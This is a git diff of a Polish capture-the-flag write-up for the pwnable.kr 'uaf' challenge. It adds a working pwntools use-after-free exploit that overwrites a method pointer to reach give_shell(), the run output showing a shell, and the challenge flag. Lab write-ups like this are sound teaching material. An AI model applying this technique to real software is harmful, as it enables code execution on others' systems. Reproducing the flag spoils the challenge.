@@ -1,6 +1,6 @@
 ## uaf - 8 pt ##
 
-Flaga: `flag`
+Flaga: `yay_f1ag_aft3r_pwning`
 
 Kod źródłowy **uaf.c**:
 
@@ -241,5 +241,43 @@ EFLAGS: 0x246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)
 Legend: code, data, rodata, value
 
 Breakpoint 1, 0x0000000000400fd4 in main ()
+```
+* Widać wyraźnie które bajty odpowiadają za wartość rejestru `RAX`, który zawiera wskaźnik metody
+* Podmieniając w/w bajty na wskaźnik funkcji `give_shell()` jesteśmy w stanie wykonywać dowolne komendy z uprawnieniami pozwalającymi na odczytanie flagi 
+* Wskaźniki na `give_shell()` można znaleźć we wcześniejszym listingu z gdb (`RAX & RBX`): `0x401570` oraz `0x401550`
+* Na ostatniej prostej pojawia się jeszcze jedna przeszkoda: instrukcja `0x400fd4 <main+272>:	add    rax,0x8`, wg. której wymagane jest od znalezionych wskaźników odjęcie liczby 8.
+* Aby nie tworzyć plików w środowisku pwnable.kr, można podać jako plik `/dev/stdin` i za jego pomocą wrzucić dane jak w poniższym exploicie:
+```python
+from pwn import *
+context(arch='amd64', os='linux')
 
+c = ssh(host='pwnable.kr', port=2222, user='uaf', password='guest')
+
+p = c.process(["./uaf", "24", "/dev/stdin"])
+p.recv(1024)
+
+p.sendline("3")
+p.recv(1024)
+
+p.sendline("2")
+p.send("\x68\x15\x40\x00\x00\x00\x00\x00")
+p.recvuntil('free\n')
+
+p.sendline("2")
+p.send("\x68\x15\x40\x00\x00\x00\x00\x00")
+p.recvuntil('free\n')
+
+p.sendline("1")
+p.interactive()
+```
+* Uruchomienie:
+```
+[x] Connecting to pwnable.kr on port 2222
+[+] Connecting to pwnable.kr on port 2222: Done
+[!] Couldn't check security settings on 'pwnable.kr'
+[x] Starting remote process './uaf' on pwnable.kr
+[+] Starting remote process './uaf' on pwnable.kr: pid 3378
+[*] Switching to interactive mode
+$ cat flag
+yay_f1ag_aft3r_pwning
 ```
